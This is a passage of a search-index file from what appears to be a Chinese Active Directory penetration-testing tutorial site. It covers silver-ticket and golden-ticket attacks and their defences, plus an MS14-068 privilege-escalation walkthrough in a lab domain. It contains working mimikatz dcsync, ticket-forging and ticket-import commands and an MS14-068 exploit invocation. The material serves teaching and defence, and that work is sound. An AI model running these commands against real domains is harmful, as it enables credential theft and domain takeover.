\u8fdb\u884c\u653b\u51fb\u7684\u8bdd\uff0c\u653b\u51fb\u673a\u53ef\u4ee5\u662f\u57df\u4e2d\u7684\u666e\u901a\u673a\u5668\uff0c\u4e5f\u53ef\u4ee5\u4e0d\u662f\u57df\u4e2d\u7684\u673a\u5668\u3002\u5f53\u653b\u51fb\u673a\u4e0d\u5728\u57df\u4e2d\u65f6\uff0c\u9700\u8981\u5c06 DNS \u670d\u52a1\u5668\u8bbe\u7f6e\u4e3a\u57df\u63a7\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u5f53\u4e3b\u673a\u4e0d\u5728\u57df\u5185\u65f6\uff0c\u914d\u7f6e\u5176 DNS \u670d\u52a1\u5668\u4e3a\u57df\u63a7 10.211.55.4\u3002</p> <p></p> <p>\u9996\u5148\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u53ef\u4ee5\u770b\u5230\u672c\u673a\u5e76\u6ca1\u6709\u6743\u9650\u5bfc\u51fa\u57df\u5185\u4efb\u610f\u7528\u6237\u54c8\u5e0c\u3002</p> <pre><code>mimikatz.exe \"lsadump::dcsync /domain:xie.com /user:krbtgt /csv\" \"exit\"\n</code></pre> <p></p> <p>\u7136\u540e\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u751f\u6210\u767d\u94f6\u7968\u636e\u5e76\u5bfc\u5165\u5185\u5b58\u4e2d\uff0c\u5c31\u62e5\u6709\u5bfc\u51fa\u4efb\u610f\u7528\u6237\u54c8\u5e0c\u7684\u6743\u9650\u4e86\u3002</p> <pre><code>mimikatz.exe\n\n#\u751f\u6210\u5e76\u5bfc\u5165\u9ec4\u91d1\u7968\u636e\u5230\u5f53\u524d\u5185\u5b58\u4e2d\nkerberos::golden /domain:xie.com /sid:S-1-5-21-1313979556-3624129433-4055459191 /target:AD01.xie.com /service:ldap /rc4:d5d05db9b06988c17f903ef4847d9367 /user:administrator /ptt\n\n#\u9a8c\u8bc1\u662f\u5426\u6210\u529f\uff0c\u5bfc\u51fa\u6307\u5b9a\u7528\u6237\u54c8\u5e0c\nlsadump::dcsync /domain:xie.com /user:krbtgt /csv\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u901a\u8fc7\u5bf9\u57df\u63a7\u7684 ldap \u670d\u52a1\u8fdb\u884c\u767d\u94f6\u7968\u636e\u653b\u51fb\u4e4b\u540e\uff0c\u5373\u6709\u6743\u9650\u5bfc\u51fa\u57df\u5185\u4efb\u610f\u7528\u6237\u54c8\u5e0c\u4e86\uff01</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_permission_maintenance_and_post_penetration_password_collection/article1/index.html#3-cobaltstrike_1","title":"3.\u4f7f\u7528 CobaltStrike \u8fdb\u884c\u653b\u51fb","text":"<p>\u5f53\u4f7f\u7528 CobaltStrike \u8fdb\u884c\u653b\u51fb\u65f6\uff0c\u4e0a\u7ebf\u7684\u673a\u5668\u53ef\u4ee5\u662f\u57df\u4e2d\u7684\u666e\u901a\u673a\u5668\uff0c\u4e5f\u53ef\u4ee5\u4e0d\u662f\u57df\u4e2d\u7684\u673a\u5668\u3002\u5f53\u4e0a\u7ebf\u7684\u673a\u5668\u4e0d\u5728\u57df\u4e2d\u65f6\uff0c\u9700\u8981\u5c06\u8be5\u673a\u5668\u7684 DNS \u670d\u52a1\u5668\u8bbe\u7f6e\u4e3a\u57df\u63a7\u3002\u547d\u4ee4\u884c\u8bbe\u7f6e DNS \u670d\u52a1\u5668\u547d\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>netsh interface ip set dns \"\u4ee5\u592a\u7f51\" static 10.211.55.4\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u901a\u8fc7 CobaltStrike \u8bbe\u7f6e\u5f53\u524d\u4e3b\u673a\u7684 DNS \u4e3a 10.211.55.4\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u67e5\u8be2\u5373\u53ef\u770b\u5230 DNS \u670d\u52a1\u5668\u6b64\u65f6\u5df2\u7ecf\u8bbe\u7f6e\u4e3a 10.211.55.4 \u4e86\u3002</p> <p></p> <p>\u7531\u4e8e CobaltStrike \u9ed8\u8ba4\u81ea\u5e26\u6ca1\u6709\u767d\u94f6\u7968\u636e\u7684\u529f\u80fd\uff0c\u56e0\u6b64\u8fd9\u91cc\u4f7f\u7528\u63d2\u4ef6\u8fdb\u884c\u767d\u94f6\u7968\u636e\u653b\u51fb\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u8f93\u5165\u76f8\u5e94\u7684\u4fe1\u606f\u540e\uff0c\u70b9\u51fb Build\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u767d\u94f6\u7968\u636e\u751f\u6210\u5e76\u5bfc\u5165\u5185\u5b58\u4e2d\u4e86\u3002</p> <p></p> <p>\u7136\u540e\u5c31\u53ef\u4ee5\u6267\u884c\u9ad8\u6743\u9650\u64cd\u4f5c\u4e86\u3002\u5982\u56fe\u6240\u793a\uff0c\u5bfc\u51fa\u57df\u5185\u4efb\u610f\u7528\u6237\u54c8\u5e0c\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_permission_maintenance_and_post_penetration_password_collection/article1/index.html#_1","title":"\u9ec4\u91d1\u7968\u636e\u548c\u767d\u94f6\u7968\u636e\u7684\u8054\u7cfb\u548c\u533a\u522b","text":""},{"location":"CTF/Intranet_security/Domain_AD/Domain_permission_maintenance_and_post_penetration_password_collection/article1/index.html#1","title":"1.\u8054\u7cfb","text":"<ul> <li>\u4e24\u8005\u90fd\u662f\u57fa\u4e8e Kerberos \u8ba4\u8bc1\u7684\u653b\u51fb\u65b9\u5f0f</li> <li>\u4e24\u8005\u90fd\u5c5e\u4e8e\u7968\u636e\u4f20\u9012\u653b\u51fb</li> <li>\u4e24\u8005\u90fd\u5e38\u88ab\u7528\u6765\u505a\u540e\u6e17\u900f\u6743\u9650\u7ef4\u6301</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_permission_maintenance_and_post_penetration_password_collection/article1/index.html#2","title":"2.\u533a\u522b","text":""},{"location":"CTF/Intranet_security/Domain_AD/Domain_permission_maintenance_and_post_penetration_password_collection/article1/index.html#1_1","title":"(1) \u8bbf\u95ee\u6743\u9650\u7684\u4e0d\u540c","text":"<ul> <li>\u9ec4\u91d1\u7968\u636e\uff1a\u901a\u8fc7\u4f2a\u9020\u9ad8\u6743\u9650\u7684 TGT \u8ba4\u8d2d\u6743\u8bc1\uff0c\u53ef\u4ee5\u4ee5\u9ad8\u6743\u9650\u8bbf\u95ee\u4efb\u4f55\u670d\u52a1\u3002</li> <li>\u767d\u94f6\u7968\u636e\uff1a\u901a\u8fc7\u4f2a\u9020\u9ad8\u6743\u9650\u7684 ST \u670d\u52a1\u7968\u636e\uff0c\u53ea\u53ef\u4ee5\u4ee5\u9ad8\u6743\u9650\u8bbf\u95ee\u6307\u5b9a\u670d\u52a1\u3002</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_permission_maintenance_and_post_penetration_password_collection/article1/index.html#2_1","title":"(2) \u52a0\u5bc6\u5bc6\u94a5\u7684\u4e0d\u540c","text":"<ul> <li>\u9ec4\u91d1\u7968\u636e\uff1a\u7531\u4e8e TGT \u8ba4\u8d2d\u6743\u8bc1\u662f\u901a\u8fc7 krbtgt \u5bc6\u94a5\u52a0\u5bc6\u7684\uff0c\u56e0\u6b64\u9ec4\u91d1\u7968\u636e\u5229\u7528\u9700\u8981\u77e5\u9053 krbtgt \u7684\u5bc6\u94a5\u3002</li> <li>\u767d\u94f6\u7968\u636e\uff1a\u7531\u4e8e ST \u670d\u52a1\u7968\u636e\u662f\u901a\u8fc7\u670d\u52a1\u5bc6\u94a5\u52a0\u5bc6\u7684\uff0c\u56e0\u6b64\u767d\u94f6\u7968\u636e\u5229\u7528\u9700\u8981\u77e5\u9053\u6307\u5b9a\u670d\u52a1\u7684\u5bc6\u94a5\u3002</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_permission_maintenance_and_post_penetration_password_collection/article1/index.html#3","title":"(3) \u65e5\u5fd7\u7684\u4e0d\u540c","text":"<ul> <li>\u9ec4\u91d1\u7968\u636e\uff1a\u9ec4\u91d1\u7968\u636e\u56e0\u4e3a\u53ea\u4f2a\u9020\u4e86 TGT \u8ba4\u8d2d\u6743\u8bc1\uff0c\u56e0\u6b64\u8fd8\u9700\u8981\u8ddfKDC \u8fdb\u884c TGS \u8ba4\u8bc1\u901a\u4fe1\u4ee5\u83b7\u5f97 ST \u670d\u52a1\u7968\u636e\uff0c\u56e0\u6b64\u4f1a\u5728 KDC \u4e0a\u7559\u4e0b\u65e5\u5fd7\u3002</li> <li>\u767d\u94f6\u7968\u636e\uff1a\u767d\u94f6\u7968\u636e\u901a\u8fc7\u4f2a\u9020 ST \u670d\u52a1\u7968\u636e\uff0c\u53ef\u4ee5\u4e0d\u8ddf KDC \u8fdb\u884c\u901a\u4fe1\uff0c\u76f4\u63a5\u8bbf\u95ee\u6307\u5b9a\u670d\u52a1\u3002\u56e0\u6b64\u4e0d\u4f1a\u5728 KDC \u4e0a\u7559\u4e0b\u65e5\u5fd7\uff0c\u53ea\u4f1a\u5728\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u7559\u4e0b\u65e5\u5fd7\u3002</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_permission_maintenance_and_post_penetration_password_collection/article1/index.html#_2","title":"\u7968\u636e\u4f20\u9012\u653b\u51fb\u9632\u5fa1","text":""},{"location":"CTF/Intranet_security/Domain_AD/Domain_permission_maintenance_and_post_penetration_password_collection/article1/index.html#1_2","title":"1.\u9ec4\u91d1\u7968\u636e\u653b\u51fb\u9632\u5fa1","text":"<p>\u5bf9\u4e8e\u9ec4\u91d1\u7968\u636e\u653b\u51fb\u6765\u8bf4\uff0c\u7531\u4e8e TGT \u8ba4\u8d2d\u6743\u8bc1\u662f\u5728\u672c\u5730\u79bb\u7ebf\u751f\u6210\u7684\u3002\u56e0\u6b64\u5e76\u6ca1\u6709\u548c KDC \u4e4b\u95f4\u53d1\u9001 AS-REQ&amp;AS-REP \u6570\u636e\u5305\u3002\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e00\u70b9\uff0c\u68c0\u6d4bKerberos \u8ba4\u8bc1\u6d41\u7a0b\u4e2d\u7f3a\u5c11 AS-REQ&amp;AS-REP \u6570\u636e\u5305\uff0c\u4f46\u6700\u540e\u6210\u529f\u8bbf\u95ee\u670d\u52a1\u7684\u8bf7\u6c42\u8fc7\u7a0b\uff0c\u8fd9\u79cd\u8fc7\u7a0b\u53ef\u4ee5\u88ab\u5224\u5b9a\u4e3a\u662f\u9ec4\u91d1\u7968\u636e\u653b\u51fb\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_permission_maintenance_and_post_penetration_password_collection/article1/index.html#2_2","title":"2.\u767d\u94f6\u7968\u636e\u653b\u51fb\u9632\u5fa1","text":"<p>\u4e4b\u524d\u6211\u4eec\u5728 Kerberos \u7bc7\u4e2d\u63d0\u5230\u4e86 PAC \u6709\u4e24\u4e2a\u7b7e\u540dPAC_SERVER_CHECKSUM \u548c PAC_PRIVSVR_CHECKSUM\u3002\u5176\u4e2dPAC_SERVER_CHECKSUM \u662f\u7531\u670d\u52a1\u5bc6\u94a5\u7b7e\u540d\u7684\uff0cPAC_PRIVSVR_CHECKSUM\u662f\u7531 krbtgt \u5bc6\u94a5\u7b7e\u540d\u7684\u3002\u800c\u5bf9\u4e8e\u653b\u51fb\u8005\u6765\u8bf4\uff0c\u8fdb\u884c\u767d\u94f6\u7968\u636e\u653b\u51fb\u65f6\u53ea\u83b7\u5f97\u4e86\u670d\u52a1\u5bc6\u94a5\uff0c\u5e76\u6ca1\u6709 krbtgt \u5bc6\u94a5\uff0c\u56e0\u6b64\u5e76\u4e0d\u80fd\u4f2a\u9020 PAC_PRIVSVR_CHECKSUM \u7b7e\u540d\u3002\u4f46\u662f\uff0c\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cPAC_PRIVSVR_CHECKSUM \u7b7e\u540d\u7684\u9a8c\u8bc1\u662f\u53ef\u9009\u7684\uff0c\u5e76\u4e14\u9ed8\u8ba4\u4e0d\u5f00\u542f\u3002\u8fd9\u4e5f\u662f\u767d\u94f6\u7968\u636e\u653b\u51fb\u80fd\u6210\u529f\u7684\u524d\u63d0\u3002</p> <p>\u56e0\u6b64\u8981\u9488\u5bf9\u767d\u94f6\u7968\u636e\u653b\u51fb\u8fdb\u884c\u9632\u5fa1\uff0c\u6700\u597d\u7684\u529e\u6cd5\u5c31\u662f\u5f00\u542f\u76ee\u6807\u670d\u52a1\u4e3b\u673a\u7684KDC \u9a8c\u8bc1 PAC \u7b7e\u540d</p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/index.html","title":"\u57df\u5185\u6f0f\u6d1e\u548c\u5229\u7528","text":"<p>\u4ecb\u7ecd\u4e86\u8fd1\u4e9b\u5e74\u6765\u6700\u5e38\u7528\u7684\u57df\u5185\u6f0f\u6d1e\u7684\u80cc\u666f\u3001\u5f71\u54cd\u7248\u672c\u3001\u539f\u7406\u3001\u5229\u7528\u8fc7\u7a0b\u4ee5\u53ca\u4fee\u590d\u9632\u5fa1\u3002</p> <ul> <li>MS14-068 \u57df\u5185\u6743\u9650\u63d0\u5347\u6f0f\u6d1e</li> <li>CVE-2019-1040 NTLM MIC \u7ed5\u8fc7\u6f0f\u6d1e</li> <li>CVE-2020-1472 NetLogon \u6743\u9650\u63d0\u5347\u6f0f\u6d1e</li> <li>Windows Print Spooler \u6743\u9650\u63d0\u5347 \u6f0f\u6d1e PrintNightmare</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article1/index.html","title":"MS14-068 \u57df\u5185\u6743\u9650\u63d0\u5347\u6f0f\u6d1e","text":""},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article1/index.html#_1","title":"\u6f0f\u6d1e\u80cc\u666f\u548c\u63cf\u8ff0","text":"<p>2014 \u5e74 11 \u6708 19 \u65e5\uff0c\u5fae\u8f6f\u53d1\u5e03 11 \u6708\u4efd\u5b89\u5168\u8865\u4e01\u66f4\u65b0\uff0c\u5176\u4e2d\u4e00\u4e2a\u8865\u4e01KB3011780 \u5f15\u8d77\u4e86\u4eba\u4eec\u7684\u6ce8\u610f\uff0c\u8fd9\u662f\u4e00\u4e2a\u57df\u5185\u6743\u9650\u63d0\u5347\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u5141\u8bb8\u5b89\u5168\u7814\u7a76\u5458\u5728\u4ec5\u6709\u4e00\u4e2a\u666e\u901a\u57df\u8d26\u53f7\u7684\u60c5\u51b5\u4e0b\u5c06\u6743\u9650\u63d0\u5347\u4e3a\u57df\u7ba1\u7406\u5458\uff0c\u5371\u5bb3\u6781\u5927\uff01\u5fae\u8f6f\u5c06\u8be5\u6f0f\u6d1e\u7f16\u53f7\u8bbe\u7f6e\u4e3a MS14-068(CVE-2014-6324)\u3002</p> <p>\u6ce8\uff1a\u7ea2\u65e5\u9776\u573a2\u5229\u7528\u5230\u4e86\u8fd9\u4e2a\u6f0f\u6d1e</p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article1/index.html#_2","title":"\u6f0f\u6d1e\u539f\u7406","text":"<p>PAC\u662f\u4ec0\u4e48\uff1f \u53ef\u4ee5\u628aPAC\u60f3\u8c61\u6210\u662f\u4e00\u5f20\u8eab\u4efd\u8bc1\uff0c\u5b83\u8bc1\u660e\u4e86\u4f60\u5728\u7cfb\u7edf\u4e2d\u62e5\u6709\u7684\u6743\u9650\uff08\u6bd4\u5982\u666e\u901a\u7528\u6237\u3001\u7ba1\u7406\u5458\u7b49\uff09\u3002\u6bcf\u6b21\u4f60\u901a\u8fc7Kerberos\u8bf7\u6c42\u67d0\u9879\u670d\u52a1\u65f6\uff0c\u90fd\u4f1a\u9644\u4e0a\u8fd9\u5f20\u201c\u8eab\u4efd\u8bc1\u201d\u3002</p> <p>PAC\u7684\u7b7e\u540d\u673a\u5236\uff1a \u8fd9\u5f20\u201c\u8eab\u4efd\u8bc1\u201d\u4e0a\u6709\u4e24\u4e2a\u5730\u65b9\u9700\u8981\u76d6\u7ae0\uff0c\u7c7b\u4f3c\u4e24\u9053\u5370\u7ae0\uff0c\u4fdd\u8bc1\u5185\u5bb9\u6ca1\u6709\u88ab\u7be1\u6539\uff1a</p> <p>\u7b2c\u4e00\u4e2a\u5370\u7ae0\uff08PAC_SERVER_CHECKSUM\uff09\uff1a\u7531\u8bf7\u6c42\u7684\u670d\u52a1\uff08\u6bd4\u5982\u6587\u4ef6\u670d\u52a1\u5668\uff09\u7684\u5bc6\u94a5\u751f\u6210\u3002\u60f3\u8c61\u6210\u670d\u52a1\u4e3a\u4f60\u7684\u201c\u8eab\u4efd\u8bc1\u201d\u76d6\u4e86\u7ae0\uff0c\u8bc1\u660e\u4f60\u6709\u6743\u9650\u8bf7\u6c42\u8be5\u670d\u52a1\u3002</p> <p>\u7b2c\u4e8c\u4e2a\u5370\u7ae0\uff08PAC_PRIVSVR_CHECKSUM\uff09\uff1a\u7531KDC\u7684\u5bc6\u94a5\u751f\u6210\uff0c\u786e\u4fddKDC\u4e5f\u8ba4\u53ef\u8fd9\u5f20\u201c\u8eab\u4efd\u8bc1\u201d\u662f\u771f\u7684\uff0c\u6ca1\u88ab\u4f2a\u9020\u3002</p> <p>\u8fd9\u4e24\u4e2a\u7b7e\u540d\u7684\u8bbe\u8ba1\u521d\u8877\u662f\u4f7f\u7528HMAC\u7b49\u57fa\u4e8e\u5bc6\u94a5\u7684\u7b97\u6cd5\uff0c\u8fd9\u610f\u5473\u7740\u9700\u8981\u7279\u5b9a\u7684\u5bc6\u94a5\uff08krbtgt\u7684\u5bc6\u94a5\u548c\u670d\u52a1\u7684\u5bc6\u94a5\uff09\u624d\u80fd\u751f\u6210\u5408\u6cd5\u7684\u7b7e\u540d\u3002\u800c\u4f60\u4f5c\u4e3a\u666e\u901a\u7528\u6237\uff0c\u901a\u5e38\u6ca1\u6709\u8fd9\u4e9b\u5bc6\u94a5\uff0c\u56e0\u6b64\u4e0d\u80fd\u4f2a\u9020\u6709\u6548\u7684PAC\u3002</p> <p>\u95ee\u9898\u51fa\u73b0\uff1a MS14-068\u7684\u6f0f\u6d1e\u51fa\u5728\u7b7e\u540d\u7684\u5b9e\u73b0\u4e0a\uff0c\u539f\u672c\u8981\u6c42\u53ea\u80fd\u4f7f\u7528\u9700\u8981\u5bc6\u94a5\u53c2\u4e0e\u7684HMAC\u7cfb\u5217\u7b97\u6cd5\uff0c\u4f46\u5b9e\u9645\u4e2d\uff0c\u5b83\u5141\u8bb8\u4f7f\u7528MD5\u8fd9\u79cd\u4e0d\u9700\u8981\u5bc6\u94a5\u7684\u54c8\u5e0c\u7b97\u6cd5\u3002\u8fd9\u5c31\u50cf\u670d\u52a1\u548cKDC\u540c\u610f\u76d6\u7ae0\u65f6\u4f7f\u7528\u4e86\u4e00\u4e2a\u4e0d\u592a\u5b89\u5168\u7684\u5370\u7ae0\u5de5\u5177\uff0c\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u81ea\u5df1\u5236\u4f5c\u8fd9\u4e2a\u5370\u7ae0\uff0c\u800c\u4e0d\u9700\u8981\u771f\u7684\u6709\u6743\u529b\u6765\u505a\u8fd9\u4ef6\u4e8b\u3002</p> <p>\u5982\u4f55\u5229\u7528\u6f0f\u6d1e\uff1a \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u4f60\u4e0d\u9700\u8981\u670d\u52a1\u6216KDC\u7684\u5bc6\u94a5\u5c31\u80fd\u751f\u6210\u4e00\u4e2a\u201c\u6709\u6548\u7684\u201d\u7b7e\u540d\u3002\u4f60\u53ef\u4ee5\u968f\u610f\u4fee\u6539PAC\u4e2d\u7684\u5185\u5bb9\uff0c\u6bd4\u5982\u628a\u81ea\u5df1\u4ece\u666e\u901a\u7528\u6237\u6539\u6210\u7ba1\u7406\u5458\uff0c\u7136\u540e\u7528MD5\u91cd\u65b0\u751f\u6210\u7b7e\u540d\u3002\u56e0\u4e3aKDC\u4e0d\u4f1a\u518d\u68c0\u67e5\u7b7e\u540d\u7684\u6709\u6548\u6027\uff0c\u5b83\u5c31\u4f1a\u8ba4\u4e3a\u4f60\u7684\u4f2a\u9020\u201c\u8eab\u4efd\u8bc1\u201d\u662f\u771f\u7684\uff0c\u4ece\u800c\u7ed9\u4f60\u66f4\u9ad8\u7684\u6743\u9650\u3002</p> <p>\u8be5\u6f0f\u6d1e\u6700\u6838\u5fc3\u7684\u5730\u65b9\u5728\u4e8e KDC \u65e0\u6cd5\u6b63\u786e\u68c0\u67e5 ST \u670d\u52a1\u7968\u636e\u4e2d PAC \u7684\u6709\u6548\u7b7e\u540d\uff0c\u5bfc\u81f4\u7528\u6237\u53ef\u4ee5\u81ea\u5df1\u6784\u9020\u4e00\u5f20\u9ad8\u6743\u9650 PAC\uff0c\u7136\u540e\u901a\u8fc7\u6821\u9a8c\u3002PAC \u5305\u542b\u4e24\u4e2a\u6570\u5b57\u7b7e\u540d\uff1a\u4e00\u4e2a\u4f7f\u7528\u670d\u52a1\u7684 hash(PAC_SERVER_CHECKSUM)\u8fdb\u884c\u7b7e\u540d\uff0c\u53e6\u4e00\u4e2a\u4f7f\u7528krbtgt \u7684 hash(PAC_PRIVSVR_CHECKSUM)\u8fdb\u884c\u7b7e\u540d\uff0c\u8be5\u7b7e\u540d\u8bbe\u8ba1\u4e4b\u521d\u662f\u8981\u7528\u5230HMAC \u7cfb\u5217\u7684 checksum \u7b97\u6cd5\uff0c\u4e5f\u5c31\u662f\u5fc5\u987b\u8981\u6709 key \u7684\u53c2\u4e0e\uff0c\u800c\u8fd9\u91cc\u7684 key \u662fkrbtgt \u7684 hash \u548c\u670d\u52a1\u7684 hash\uff0c\u6211\u4eec\u6ca1\u6709 krbtgt \u7684 hash \u4ee5\u53ca\u670d\u52a1\u7684 hash\uff0c\u81ea\u7136\u5c31\u6ca1\u6709\u529e\u6cd5\u751f\u6210\u6709\u6548\u7684\u7b7e\u540d\u3002\u4f46\u662f\u95ee\u9898\u5c31\u51fa\u4e8e\u8be5\u7b7e\u540d\u5728\u5b9e\u73b0\u7684\u65f6\u5019\u5141\u8bb8\u6240\u6709\u7684checksum \u7b97\u6cd5\u90fd\u53ef\u4ee5\uff0c\u5305\u62ec MD5\uff0c\u56e0\u6b64\u5c31\u4e0d\u9700\u8981 key \u7684\u53c2\u4e0e\u4e86\u3002\u6b64\u65f6\u6211\u4eec\u53ea\u9700\u8981\u628a PAC \u8fdb\u884c md5\uff0c\u5c31\u751f\u6210\u4e86\u65b0\u7684\u6821\u9a8c\u548c\u3002\u8fd9\u4e5f\u5c31\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u968f\u610f\u66f4\u6539PAC \u7684\u5185\u5bb9\uff0c\u66f4\u6539\u5b8c\u4e4b\u540e\u518d\u7528 md5 \u7ed9\u4ed6\u751f\u6210\u4e00\u4e2a\u670d\u52a1\u68c0\u9a8c\u548c\u4ee5\u53ca KDC \u6821\u9a8c\u548c\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article1/index.html#_3","title":"\u6f0f\u6d1e\u590d\u73b0","text":"<p>\u5b9e\u9a8c\u73af\u5883\u5982\u4e0b\uff1a</p> <ul> <li>\u57df\u5185\u4e3b\u673a\uff1aWin7(10.211.55.6)</li> <li>\u57df\u63a7\uff1aServer2008(10.211.55.7) </li> <li>\u57df\u7528\u6237\uff1ahack</li> <li>\u57df\u7528\u6237\u5bc6\u7801\uff1aP@ss1234</li> <li>\u57df\uff1axie.com</li> </ul> <p>\u62d3\u6251\u56fe\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u76ee\u524d\u6211\u4eec\u83b7\u5f97\u4e86\u57df\u5185\u4e3b\u673a Win7 \u7684\u6743\u9650\uff0c\u8be5\u673a\u5668\u4e0a\u767b\u5f55\u7740\u666e\u901a\u57df\u7528\u6237 hack\u3002\u4ee5\u4e0b\u6f14\u793a\u5982\u4f55\u901a\u8fc7 MS14-068 \u6f0f\u6d1e\u4ece\u4e00\u4e2a\u666e\u901a\u57df\u7528\u6237\u6743\u9650 hack \u63d0\u5347\u81f3\u57df\u7ba1\u7406\u5458\u6743\u9650\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article1/index.html#_4","title":"\u6743\u9650\u63d0\u5347\u81f3\u57df\u7ba1\u7406\u5458","text":"<p>\u9996\u5148\u67e5\u770b\u5f53\u524d hack \u7528\u6237\u7684 SID\uff0c\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u7136\u540e\u5728 Win7 \u673a\u5668\u4e0a\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c\u6f0f\u6d1e\u5229\u7528\u3002</p> <pre><code>MS14-068.exe -u hack@xie.com -p P@ss1234 -s S-1-5-21-645314428-1482107640-504576158-1127 -d 10.211.55.7\n</code></pre> <p>\u53c2\u6570\u542b\u4e49\u5982\u4e0b\uff1a</p> <ul> <li>-u\uff1a\u6307\u5b9a\u57df\u7528\u6237\u540d\uff0c\u8fd9\u91cc\u662f hack@xie.com</li> <li>-p\uff1a\u6307\u5b9a\u57df\u5bc6\u7801\uff0chack \u57df\u7528\u6237\u7684\u5bc6\u7801\u4e3a P@ss1234</li> <li>-s\uff1a\u6307\u5b9a\u57df\u7528\u6237\u7684 SID\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u4e0a\u4e00\u6b65\u67e5\u8be2\u7684\u5185\u5bb9</li> <li>-d\uff1a\u6307\u5b9a\u57df\u63a7\uff0c\u57df\u63a7\u7684 ip \u4e3a 10.211.55.7</li> </ul> <p>\u5982\u56fe\u6240\u793a\uff0c\u547d\u4ee4\u8fd0\u884c\u6210\u529f\u540e\uff0c\u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u751f\u6210 ccache \u540e\u7f00\u7684\u7968\u636e\u3002</p> <p></p> <p>\u7136\u540e\u4f7f\u7528 mimikatz \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u5bfc\u5165\u4e0a\u4e00\u6b65\u751f\u6210\u7684\u7968\u636e\u3002</p> <pre><code>#\u5220\u9664\u5f53\u524d\u7f13\u5b58\u7684 kerberos \u7968\u636e\nkerberos::purge\n#\u5bfc\u5165\u6307\u5b9a\u8def\u5f84\u7684\u7968\u636e\nkerberos::ptc C:\\users\\hack\\desktop\\TGT_hack@xie.com.ccache\n</code></pre> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u6ca1\u5bfc\u5165\u7968\u636e\u4e4b\u524d\u662f\u65e0\u6cd5\u8bbf\u95ee\u57df\u63a7\u7684\u3002\u5bfc\u5165\u4e86\u7968\u636e\u540e\uff0c\u53ef\u4ee5\u8bbf\u95ee\u57df\u63a7\u4e86\uff01</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article2/index.html","title":"CVE-2019-1040 NTLM MIC \u7ed5\u8fc7\u6f0f\u6d1e","text":""},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article2/index.html#_1","title":"\u6f0f\u6d1e\u80cc\u666f\u548c\u63cf\u8ff0","text":"<p>2019 \u5e74 6 \u6708 11 \u65e5\uff0c\u5fae\u8f6f\u53d1\u5e03 6 \u6708\u4efd\u5b89\u5168\u8865\u4e01\u66f4\u65b0\u3002\u5728\u8be5\u5b89\u5168\u8865\u4e01\u66f4\u65b0\u4e2d\uff0c\u5bf9 CVE-2019-1040 \u6f0f\u6d1e\u8fdb\u884c\u4e86\u4fee\u590d\u3002\u8be5\u6f0f\u6d1e\u5b58\u5728\u4e8e Windows \u5927\u90e8\u5206\u7248\u672c\u4e2d\uff0c\u5f53\u4e2d\u95f4\u4eba\u653b\u51fb\u8005\u80fd\u591f\u6210\u529f\u7ed5\u8fc7 NTLM MIC \u6d88\u606f\u5b8c\u6574\u6027\u6821\u9a8c\u4fdd\u62a4\u65f6\uff0cWindows \u5b58\u5728\u7be1\u6539\u6f0f\u6d1e\u3002\u6210\u529f\u5229\u7528\u6b64\u6f0f\u6d1e\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u83b7\u5f97\u964d\u7ea7 NTLM \u5b89\u5168\u529f\u80fd\u7684\u80fd\u529b\u3002\u8981\u5229\u7528\u6b64\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u9700\u8981\u7be1\u6539 NTLM \u4ea4\u6362\uff0c\u7136\u540e\u653b\u51fb\u8005\u53ef\u4ee5\u4fee\u6539 NTLM 